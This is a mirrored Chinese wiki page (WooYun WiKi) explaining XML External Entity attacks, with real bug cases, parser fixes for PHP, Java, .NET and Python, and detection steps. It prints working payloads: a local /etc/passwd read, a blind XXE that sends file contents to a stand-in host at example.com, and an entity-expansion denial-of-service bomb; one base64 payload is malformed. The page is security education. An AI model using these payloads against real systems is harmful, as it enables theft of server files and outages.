<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="zh"
  lang="zh" dir="ltr" class="no-js">

<!-- Mirrored from wiki.wooyun.org/web:xxe-attack?do=edit by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 04 Dec 2015 03:03:07 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
<head>
  <meta charset="UTF-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <title>web:xxe-attack [WooYun WiKi]</title>
  <script>(function(H){H.className=H.className.replace(/\bno-js\b/,'js')})(document.documentElement)</script>
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <link rel="shortcut icon" href="lib/tpl/bootstrap3/images/favicon.ico" />
<link rel="apple-touch-icon" href="lib/tpl/bootstrap3/images/apple-touch-icon.png" />
      <link type="text/css" rel="stylesheet" href="lib/tpl/bootstrap3/assets/bootstrap/css/bootstrap.min.css" />
    <script type="text/javascript">/*<![CDATA[*/
    var TPL_CONFIG = {"tableFullWidth":1};
  /*!]]>*/</script>
  <meta name="generator" content="DokuWiki"/>
<meta name="robots" content="noindex,nofollow"/>
<link rel="search" type="application/opensearchdescription+xml" href="http://wiki.wooyun.org/lib/exe/opensearch.php" title="WooYun WiKi"/>
<link rel="start" href="http://wiki.wooyun.org/"/>
<link rel="contents" href="http://wiki.wooyun.org/web:xxe-attack?do=index" title="网站地图"/>
<link rel="alternate" type="application/rss+xml" title="最近更改" href="http://wiki.wooyun.org/feed.php"/>
<link rel="alternate" type="application/rss+xml" title="当前命名空间" href="http://wiki.wooyun.org/feed.php?mode=list&amp;ns=web"/>
<link rel="alternate" type="text/html" title="纯HTML" href="http://wiki.wooyun.org/_export/xhtml/web:xxe-attack"/>
<link rel="alternate" type="text/plain" title="Wiki Markup 语言" href="http://wiki.wooyun.org/_export/raw/web:xxe-attack"/>
<link rel="stylesheet" type="text/css" href="http://wiki.wooyun.org/lib/exe/css.php?t=bootstrap3&amp;tseed=6dcbf66232c3759c28d0e8f6d9cdfd22"/>
<script type="text/javascript">/*<![CDATA[*/var NS='web';var JSINFO = {"id":"web:xxe-attack","namespace":"web","plugin_codeprettify":{"loader_base":"\/lib\/plugins\/codeprettify\/google-code-prettify"}};
/*!]]>*/</script>
<script type="text/javascript" charset="utf-8" src="http://wiki.wooyun.org/lib/exe/js.php?tseed=6dcbf66232c3759c28d0e8f6d9cdfd22"></script>
<script type="text/javascript" charset="utf-8" src="http://wiki.wooyun.org/lib/plugins/codeprettify/google-code-prettify/run_prettify.js?lang=css"></script>
  <script type="text/javascript" src="http://wiki.wooyun.org/lib/tpl/bootstrap3/assets/bootstrap/js/bootstrap.min.js"></script>
  <style type="text/css">
    body { padding-top: 20px; }
  </style>
  <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
  <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
  <!--[if lt IE 9]>
  <script type="text/javascript" src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
  <script type="text/javascript" src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
  <![endif]-->
</head>
<body class="default page-on-panel">
  <!--[if lte IE 7 ]><div id="IE7"><![endif]--><!--[if IE 8 ]><div id="IE8"><![endif]-->

  <div id="dokuwiki__site" class="container">
    <div id="dokuwiki__top" class="site dokuwiki mode_edit tpl_bootstrap3    ">

      
      <!-- header -->
      <div id="dokuwiki__header">
        <nav class="navbar  navbar-default" role="navigation">

  <div class="container-fluid">

    <div class="navbar-header">

      <button class="navbar-toggle" type="button" data-toggle="collapse" data-target=".navbar-collapse">
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>

      <a href="http://wiki.wooyun.org/WooYun WiKi"  accesskey="h" title="[H]" class="navbar-brand"><img src="http://wiki.wooyun.org/lib/tpl/bootstrap3/images/logo.png" alt="WooYun WiKi" class="pull-left" id="dw__logo" width="20" height="20" /> <span id="dw__title" >WooYun WiKi</span></a>
    </div>

    <div class="collapse navbar-collapse">

      <ul class="nav navbar-nav" id="dw__navbar">
        <li class="active">
  <a href="http://wiki.wooyun.org/WooYun WiKi" ><i class="glyphicon glyphicon-home"></i> Home</a></li>
      </ul>

      <div class="navbar-right">

        <form action="http://wiki.wooyun.org/WooYun WiKi" accept-charset="utf-8" class="search" id="dw__search" method="get" role="search"><div class="no"><input type="hidden" name="do" value="search" /><input type="text" id="qsearch__in" accesskey="f" name="id" class="edit" title="[F]" /><input type="submit" value="搜索" class="button" title="搜索" /><div id="qsearch__out" class="ajax_qsearch JSpopup"></div></div></form>
        <ul class="nav navbar-nav" id="dw__tools">
  <li class="dropdown">
    <a href="#" class="dropdown-toggle" data-toggle="dropdown" title="工具"><i class="glyphicon glyphicon-wrench"></i> <span class="hidden-lg hidden-md hidden-sm">工具</span> <span class="caret"></span></a>
    <ul class="dropdown-menu tools" role="menu">

      <!-- dokuwiki__usertools -->
      <li class="dropdown-header"><i class="glyphicon glyphicon-user"></i> 用户工具</li>
      
      <li class="divider"></li>

      <!-- dokuwiki__sitetools -->
      <li class="dropdown-header"><i class="glyphicon glyphicon-cog"></i> 站点工具</li>
      <li><a href="http://wiki.wooyun.org/web:xxe-attack?do=recent"  class="action recent" accesskey="r" rel="nofollow" title="最近更改 [R]"><i class="glyphicon glyphicon-list-alt"></i> 最近更改</a></li><li><a href="http://wiki.wooyun.org/web:xxe-attack?do=media&amp;ns=web"  class="action media" rel="nofollow" title="媒体管理器"><i class="glyphicon glyphicon-picture"></i> 媒体管理器</a></li><li><a href="http://wiki.wooyun.org/web:xxe-attack?do=index"  class="action index" accesskey="x" rel="nofollow" title="网站地图 [X]"><i class="glyphicon glyphicon-list"></i> 网站地图</a></li>
      <li class="divider"></li>

      <!-- dokuwiki__pagetools -->
      <li class="dropdown-header"><i class="glyphicon glyphicon-file"></i> 页面工具</li>
      <li class="active"><a href="http://wiki.wooyun.org/web:xxe-attack?do="  class="action show" accesskey="v" rel="nofollow" title="显示页面 [V]"><i class="glyphicon glyphicon-edit"></i> 显示页面</a></li><li><a href="http://wiki.wooyun.org/web:xxe-attack?do=revisions"  class="action revs" accesskey="o" rel="nofollow" title="修订记录 [O]"><i class="glyphicon glyphicon-time"></i> 修订记录</a></li><li><a href="http://wiki.wooyun.org/web:xxe-attack?do=backlink"  class="action backlink" rel="nofollow" title="反向链接"><i class="glyphicon glyphicon-link"></i> 反向链接</a></li><li><a href="#dokuwiki__top"  class="action top" accesskey="t" rel="nofollow" title="回到顶部 [T]"><i class="glyphicon glyphicon-chevron-up"></i> 回到顶部</a></li>
    </ul>
  </li>
</ul>

        <ul class="nav navbar-nav">
          <li>
                      </li>
                    <li><a href="http://wiki.wooyun.org/web:xxe-attack?do=login&amp;sectok=a3845e1693337b10c6abaa01a16b0594"  class="action login" rel="nofollow" title="登录"><i class="glyphicon glyphicon-log-in"></i> 登录</a></li>        </ul>

      </div>

    </div>
  </div>
</nav>
      </div>
      <!-- /header -->

      
            <div id="dw__breadcrumbs">
        <hr/>
                        <div class="breadcrumb hidden-print"><span class="bchead">您的足迹:</span> <span class="bcsep">•</span> <bdi><a href="http://wiki.wooyun.org/wooyunwifi:basic"  class="breadcrumbs" title="wooyunwifi:basic">basic</a></bdi> <span class="bcsep">•</span> <bdi><a href="http://wiki.wooyun.org/wooyunwifi:console"  class="breadcrumbs" title="wooyunwifi:console">console</a></bdi> <span class="bcsep">•</span> <bdi><a href="http://wiki.wooyun.org/wooyunwifi:config"  class="breadcrumbs" title="wooyunwifi:config">config</a></bdi> <span class="bcsep">•</span> <bdi><a href="http://wiki.wooyun.org/wooyunwifi:bug_recovery"  class="breadcrumbs" title="wooyunwifi:bug_recovery">bug_recovery</a></bdi> <span class="bcsep">•</span> <bdi><a href="http://wiki.wooyun.org/server:github"  class="breadcrumbs" title="server:github">github</a></bdi> <span class="bcsep">•</span> <bdi><a href="http://wiki.wooyun.org/server:git"  class="breadcrumbs" title="server:git">git</a></bdi> <span class="bcsep">•</span> <bdi><a href="http://wiki.wooyun.org/server:svn"  class="breadcrumbs" title="server:svn">svn</a></bdi> <span class="bcsep">•</span> <bdi><a href="http://wiki.wooyun.org/server:ds_store"  class="breadcrumbs" title="server:ds_store">ds_store</a></bdi> <span class="bcsep">•</span> <bdi><a href="http://wiki.wooyun.org/server:sitebackup"  class="breadcrumbs" title="server:sitebackup">sitebackup</a></bdi> <span class="bcsep">•</span> <span class="curid"><bdi><a href="http://wiki.wooyun.org/server:web.xml"  class="breadcrumbs" title="server:web.xml">web.xml</a></bdi></span></div>
                <hr/>
      </div>
      
      <p class="pageId text-right">
        <span class="label label-default">web:xxe-attack</span>
      </p>

      <div id="dw__msgarea">
              </div>

      <main class="main row" role="main">

        
        <!-- ********** CONTENT ********** -->
        <article id="dokuwiki__content" class="container" >

          <div class="panel panel-default" > 
            <div class="page group panel-body">

                                          
              <div class="pull-right hidden-print" data-spy="affix" data-offset-top="150" style="z-index:1024; top:10px; right:10px;">
                              </div>

              <!-- wikipage start -->
              
<p>
本页面只读。您可以查看源文件，但不能更改它。如果您觉得这是系统错误，请联系管理员。
</p>
    <div class="editBox" role="application">

    <div class="toolbar group">
        <div id="draft__status"></div>
        <div id="tool__bar"></div>
    </div>
    <form id="dw__editform" method="post" action="#" accept-charset="utf-8"><div class="no">
<input type="hidden" name="sectok" value="a3845e1693337b10c6abaa01a16b0594" /><input type="hidden" name="id" value="web:xxe-attack" /><input type="hidden" name="rev" value="0" /><input type="hidden" name="date" value="1437672424" /><input type="hidden" name="prefix" value="." /><input type="hidden" name="suffix" value="" /><input type="hidden" name="changecheck" value="5893cdca267f6c4bd703d4c3104c1fd2" /><input type="hidden" name="target" value="section" /><textarea name="wikitext" id="wiki__text" dir="auto" class="edit" cols="80" rows="10" tabindex="1" readonly="readonly">
====== XML External Entity attack/XXE攻击 ======


==== 1、相关背景介绍 ====

**可扩展标记语言（eXtensible Markup Language，XML）**是一种标记语言，被设计用来传输和存储数据。XML应用极其广泛，如：
    
  * 普通列表项目文档格式：OOXML，ODF，PDF，RSS……
  * 图片格式：SVG，EXIF Headers……
  * 网络协议：WebDAV，CalDAV，XMLRPC，SOAP，REST，XMPP，SAML，XACML……
  * 配置文件：Spring配置文件，Struts2配置文件……

在XML 1.0标准中定义了实体的概念，实体是用于定义引用普通文本或特殊字符的快捷方式的变量，实体可在内部或外部进行声明。

包含内部实体的XML文档：

&lt;code xml&gt;
&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;

&lt;!DOCTYPE entity [
  &lt;!ENTITY copyright &quot;Copyright wiki.wooyun.org&quot;&gt;
]&gt;

&lt;wooyun&gt;
  &lt;internal&gt;&amp;copyright;&lt;/internal&gt;
&lt;/wooyun&gt;
&lt;/code&gt;

包含外部实体的XML文档：

&lt;code xml&gt;
&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;

&lt;!DOCTYPE entity [
  &lt;!ENTITY wiki SYSTEM &quot;http://wiki.wooyun.org/&quot;&gt;
]&gt;
    
&lt;wooyun&gt;
  &lt;external&gt;&amp;wiki;&lt;/external&gt;
&lt;/wooyun&gt;
&lt;/code&gt;

在解析XML时，实体将会被替换成相应的引用内容。

**XML外部实体（XML External Entity，XXE）攻击**是一种常见的Web安全漏洞，攻击者可以通过XML的外部实体获取服务器中本应被保护的数据。

==== 2、成因 ====

XML解析器解析外部实体时支持多种协议：

|libxml2 |PHP             |Java    |.NET    |
|--------|----------------|--------|--------|
|file    |file            |file    |file    |
|http    |http            |http    |http    |
|ftp     |ftp             |ftp     |ftp     |
|        |php             |https   |https   |
|        |compress.zlib   |jar     |        |
|        |data            |netdoc  |        |
|        |glob            |mailto  |        |
|        |phar            |gopher  |        |


如使用file协议可以读取本地文件内容、使用http协议可以获取Web资源等，因此攻击者可构造恶意的外部实体，当解析器解析了包含“恶意”外部实体的XML类型文件时，便会导致被XXE攻击。

下面这个XML被解析时便会将本地''/etc/passwd''文件的内容读出来：

&lt;code xml&gt;
&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;

&lt;!DOCTYPE entity [
  &lt;!ENTITY file SYSTEM &quot;file:///etc/passwd&quot;&gt;
]&gt;

&lt;wooyun&gt;
  &lt;external&gt;&amp;file;&lt;/external&gt;
&lt;/wooyun&gt;
&lt;/code&gt;

*注：如果读取的文件本身包含“&lt;”、“&amp;”等字符时会产生失败的情况，对于此类文件可以使用Base64编码绕过，具体方法如下：*

&lt;code xml&gt;
&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;

&lt;!DOCTYPE entity [
  &lt;!ENTITY file SYSTEM ENTITY e SYSTEM &quot;php://filter/read=convert.base64-encode/resource=http://wiki.wooyun.org&quot;&gt;
]&gt;

&lt;wooyun&gt;
  &lt;external&gt;&amp;file;&lt;/external&gt;
&lt;/wooyun&gt;
&lt;/code&gt; 

不同的解析器可能默认对于外部实体会有不同的处理规则,以PHP语言为例，xml\_parse的实现方式为expat库，而simplexml\_load使用的是libxml库，两个底层库在解析的时候细节并不一样，expat默认对外部实体并不解析，而simplexml\_load默认情况下会解析外部实体等，所以simplexml\_load函数会受此问题影响，而xml\_parse则默认不会受到影响。下面是几种常见语言可能会受到此问题影响的解析XML的方法：

|PHP         |Java            |.NET                    |
|------------|----------------|------------------------|
|DOM         |（待补充）       |System.Xml.XmlDocument  |
|SimpleXML   |                |System.Xml.XmlReader    |


==== 3、攻击方式及危害 ====

XXE的攻击方式分为**显式攻击**和**盲攻击**两种：

上述POC即为显式攻击，攻击者通过正常的回显将外部实体里的内容读取出来。

但是，在有些情况下无法通过这种方式完成XXE攻击，这时我们可以采取盲攻击的办法。

XXE盲攻击利用参数实体将本地文件内容读出来后，作为URL中的参数向其指定服务器发起请求，然后在其指定服务器的日志（Apache日志）中读出文件的内容。

因在dtd中使用%来定义参数实体的方式只能在外部子集中使用，或由外部文件定义参数实体，引用到XML文件的dtd来使用，所以XML文件稍有不同：

&lt;code xml&gt;
&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
    
&lt;!DOCTYPE entity [
  &lt;!ENTITY % call SYSTEM &quot;http://example.com/evil.xml&quot;&gt;
  %call;
]&gt;
    
&lt;wooyun&gt;
  &lt;text&gt;test&lt;/text&gt;
&lt;/wooyun&gt;
&lt;/code&gt;
    
其中''http://example.com/evil.xml''里的内容是：

&lt;code xml&gt;
&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;
&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM 'http://example.com/?file=%file;'&gt;&quot;&gt;
%int;
%send;
&lt;/code&gt;

危害：

XXE漏洞会导致读取任意未授权文件，如上述POC即可读取服务器中的''/etc/passwd''文件；

因为基于树的XML解析器会把全部加载到内存中，因此XXE漏洞也有可能被用来恶意消耗内存进行拒绝服务攻击，例如:

&lt;code xml&gt;
&lt;?xml version = &quot;1.0&quot;?&gt;
    
&lt;!DOCTYPE entity [  
    &lt;!ENTITY wooyun &quot;wooyun&quot;&gt;
    &lt;!ELEMENT wooyunz (#PCDATA)&gt;
    &lt;!ENTITY wooyun1 &quot;&amp;wooyun;&amp;wooyun;&amp;wooyun;&amp;wooyun;&amp;wooyun;&amp;wooyun;&amp;wooyun;&amp;wooyun;&amp;wooyun;&amp;wooyun;&quot;&gt;
    &lt;!ENTITY wooyun2 &quot;&amp;wooyun1;&amp;wooyun1;&amp;wooyun1;&amp;wooyun1;&amp;wooyun1;&amp;wooyun1;&amp;wooyun1;&amp;wooyun1;&amp;wooyun1;&amp;wooyun1;&quot;&gt;
    &lt;!ENTITY wooyun3 &quot;&amp;wooyun2;&amp;wooyun2;&amp;wooyun2;&amp;wooyun2;&amp;wooyun2;&amp;wooyun2;&amp;wooyun2;&amp;wooyun2;&amp;wooyun2;&amp;wooyun2;&quot;&gt;
    &lt;!ENTITY wooyun4 &quot;&amp;wooyun3;&amp;wooyun3;&amp;wooyun3;&amp;wooyun3;&amp;wooyun3;&amp;wooyun3;&amp;wooyun3;&amp;wooyun3;&amp;wooyun3;&amp;wooyun3;&quot;&gt;
    &lt;!ENTITY wooyun5 &quot;&amp;wooyun4;&amp;wooyun4;&amp;wooyun4;&amp;wooyun4;&amp;wooyun4;&amp;wooyun4;&amp;wooyun4;&amp;wooyun4;&amp;wooyun4;&amp;wooyun4;&quot;&gt;
    &lt;!ENTITY wooyun6 &quot;&amp;wooyun5;&amp;wooyun5;&amp;wooyun5;&amp;wooyun5;&amp;wooyun5;&amp;wooyun5;&amp;wooyun5;&amp;wooyun5;&amp;wooyun5;&amp;wooyun5;&quot;&gt;
    &lt;!ENTITY wooyun7 &quot;&amp;wooyun6;&amp;wooyun6;&amp;wooyun6;&amp;wooyun6;&amp;wooyun6;&amp;wooyun6;&amp;wooyun6;&amp;wooyun6;&amp;wooyun6;&amp;wooyun6;&quot;&gt;
    &lt;!ENTITY wooyun8 &quot;&amp;wooyun7;&amp;wooyun7;&amp;wooyun7;&amp;wooyun7;&amp;wooyun7;&amp;wooyun7;&amp;wooyun7;&amp;wooyun7;&amp;wooyun7;&amp;wooyun7;&quot;&gt;
    &lt;!ENTITY wooyun9 &quot;&amp;wooyun8;&amp;wooyun8;&amp;wooyun8;&amp;wooyun8;&amp;wooyun8;&amp;wooyun8;&amp;wooyun8;&amp;wooyun8;&amp;wooyun8;&amp;wooyun8;&quot;&gt;
]&gt;

&lt;wooyun&gt;&amp;wooyun9;&lt;/wooyun&gt;
&lt;/code&gt;
    
这个XML在定义实体是不断嵌套调用，如解析时未对大小进行限制，则可能会导致内存大量被消耗，从而实现拒绝服务攻击。

此外，还可以利用支持的协议构造出很多相关的攻击，如探测内网信息（如检测服务等）等。

==== 4、实际案例 ====

**gainover：WooYun-2014-59783：[[http://wooyun.org/bugs/wooyun-2014-059783|百度某功能XML实体注入（二）]] **

由于SVG本身是基于XML的，该漏洞在SVG转成JPG图片时的XML解析过程中厂商仅直接过滤了''ENTITY''关键字，但是由于DTD本身就支持调用外部的DTD文件，因此通过调用''&lt;!DOCTYPE svg SYSTEM &quot;http://example.com/xxe.dtd&quot;&gt;''的方式引入外部的DTD文件即成功避开了对''ENTITY''关键字的过滤，其中''xxe.dtd''的内容如下：

&lt;code xml&gt;  
&lt;!ENTITY test SYSTEM &quot;file:///etc/passwd&quot;&gt;
&lt;/code&gt;

**iv4n：WooYun-2014-74069：[[http://www.wooyun.org/bugs/wooyun-2014-074069|鲜果网RSS导入Blind XXE漏洞]]**

该漏洞的过程是利用参数实体实现了XXE盲攻击，在读取本地文件后，将读出本地文件的内容作为URL中的参数向其指定服务器发起请求，在指定服务器的Apache日志中即可看到读出的文件内容。

**五道口杀气：WooYun-2014-59911：[[http://www.wooyun.org/bugs/wooyun-2014-059911|从开源中国的某XXE漏洞到主站shell]]**

该漏洞在格式化xml时进行了解析且没有对外部实体进行限制，所以产生服务器上任意文件被读取的问题，从而导致主站的ssh用户名和密码泄露，被成功getshell。

==== 5、修复方案 ====

在默认情况下关闭内联DTD解析（Inline DTD parsing）、外部实体、实体，使用白名单来控制允许实用的协议。

了解所使用的XML解析器是否默认解析外部实体，如果默认解析应根据实际情况进行关闭或者限制。下面给出了一些常见的关闭方法：

**PHP：**

对于使用SimpleXML解析XML的方法可在加载实体之前添加''libxml_disable_entity_loader(true);''语句以进制解析外部实体。

对于使用DOM解析XML的方法可在加载实体之前添加''libxml_disable_entity_loader(true);''语句或者使用：

&lt;code php&gt;
&lt;?php
// with the DOM functionality:
$dom = new DOMDocument();
$dom-&gt;loadXML($badXml,LIBXML_DTDLOAD|LIBXML_DTDATTR);
?&gt;
&lt;/code&gt;

对于XMLReader解析XML的方法可使用：

&lt;code php&gt;
&lt;?php
// with the XMLReader functionality:
$doc = XMLReader::xml($badXml,'UTF-8',LIBXML_NONET);
?&gt;
&lt;/code&gt;

**Java：**

&lt;code java&gt;
DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();
dbf.setExpandEntityReferences(false);
&lt;/code&gt;

**.Net：**

对于使用System.Xml.XmlReader解析XML的方法：

默认情况下，外部资源使用没有用户凭据的XmlUrlResolver对象进行解析。这意味着在默认情况下，可以访问任何不需要凭据的位置。通过执行下列操作之一，可以进一步保证安全：

  * 通过将XmlReaderSettings.XmlResolver属性设置为XmlSecureResolver对象限制XmlReader可访问的资源。
  * 通过将XmlReaderSettings.XmlResolver属性设置为null，不允许XmlReader打开任何外部资源。

对于利用超大的XML文档进行拒绝服务攻击的问题，使用XmlReader时，通过设置MaxCharactersInDocument属性，可以限制能够分析的文档大小。通过设置MaxCharactersFromEntities属性，可以限制从扩展实体中生成的字符数。

**Python：**

&lt;code python&gt;
from lxml import etree
xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))
&lt;/code&gt;
    


==== 6、漏洞扫描与发现 ====
检测XML是否被解析
&lt;code xml&gt;

&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;!DOCTYPE ANY [
	&lt;!ENTITY xxe &quot;xxe test&quot;&gt;
]&gt;
&lt;root&gt;&amp;xxe;&lt;/root&gt;
&lt;/code&gt;

如果显示了xxe test证明支持，进行第二步

是否支持外部实体:
&lt;code xml&gt;
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;!DOCTYPE ANY [
	&lt;!ENTITY % xxe SYSTEM &quot;http://192.168.5.1/xxe.xml&quot;&gt;
%xxe;
]&gt;
&lt;/code&gt;

观察自己的服务器上得access.log，如果有xxe.xml的请求，证明可以加载外部实体。

然后判断是否有回显，有回显就直接加载外部实体来进行攻击

不能回显，则使用Blind XXE攻击方法

==== 7、相关其他安全问题 ====

未知

==== 8、相关资源 ====

[[http://www.w3school.com.cn/x.asp|w3school：XML系列教程]]

[[http://security.tencent.com/index.php/blog/msg/69|Mark4z5：未知攻焉知防——XXE漏洞攻防]]

[[https://www.owasp.org/index.php/XML_External_Entity_\(XXE\)_Processing|XML External Entity (XXE) Processing]]

[[http://blog.csdn.net/u011721501/article/details/43775691|读源码的猫：XXE漏洞以及Blind XXE总结]]

[[http://websec.io/2012/08/27/Preventing-XEE-in-PHP.html|Chris Cornutt：Preventing XXE in PHP]]

[[https://www.youtube.com/watch?v=eHSNT8vWLfc|Timothy D.Morgan：What You Didn't Know About XML External Entities Attacks]]
</textarea>
<div id="wiki__editbar" class="editBar">
<div id="size__ctl">
</div>
</div>
</div></form>
</div>

              <!-- wikipage stop -->

                            
            </div>
          </div>

        </article>

        
      </main>

      <footer id="dokuwiki__footer" class="small hidden-print">

        <a href="javascript:void(0)" class="back-to-top hidden-print btn btn-default btn-sm" title="跳至内容>" id="back-to-top"><i class="glyphicon glyphicon-chevron-up"></i></a>

                <div class="text-center">
          <p id="dw__license">
                      </p>
                  </div>
      </footer>

      
    </div><!-- /site -->

    <div class="no"><img src="http://wiki.wooyun.org/lib/exe/indexer.php?id=web%3Axxe-attack&amp;1449197636" width="2" height="1" alt="" /></div>
    <div id="screen__mode" class="no">
      <span class="visible-xs"></span>
      <span class="visible-sm"></span>
      <span class="visible-md"></span>
      <span class="visible-lg"></span>
    </div>
  </div>
  <!--[if ( lte IE 7 | IE 8 ) ]></div><![endif]-->
</body>
<script>
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "http://hm.baidu.com/hm.js?2e9369dace9479584f08203285c7cbce";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script>

<!-- Mirrored from wiki.wooyun.org/web:xxe-attack?do=edit by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 04 Dec 2015 03:03:07 GMT -->
</html>
